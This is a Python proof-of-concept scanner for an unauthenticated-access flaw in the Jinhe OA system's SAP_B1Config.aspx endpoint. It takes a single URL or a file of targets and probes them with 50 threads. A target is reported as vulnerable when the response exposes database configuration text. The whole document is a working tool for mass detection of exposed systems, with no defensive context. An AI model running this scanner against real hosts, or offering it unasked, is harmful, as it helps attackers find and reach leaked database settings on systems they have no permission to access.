import requests
import argparse
from multiprocessing.dummy import Pool

def main():
    parse = argparse.ArgumentParser(description="金和OAsap-b1config-aspx 未授权")
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parse.parse_args()
    pool = Pool(50)
    if args.url:
        if 'http' in args.url:
            check(args.url)
        else:
            args.url = f"http://{args.url}"
            check(args.url)
    elif args.file:
        f = open(args.file, 'r+')
        targets = []
        for target in f.readlines():
            target = target.strip()
            if 'http' in target:
                targets.append(target)
            else:
                target = f"http://{target}"
                targets.append(target)
        pool.map(check, targets)
        pool.close()


def check(target):
    url = f"{target}/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1"
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate, br',
        'Connection':'close'
    }

    response = requests.post(url, headers=headers, verify=False, timeout=3)
    try:
        if response.status_code == 200 and '数据库' in response.text:
            print(f"[*] {target} 存在漏洞")
        else:
            print(f"[!] {target} 不存在漏洞")
    except Exception as e:
        print(f"[Error] {target} TimeOut")


if __name__ == '__main__':
    main()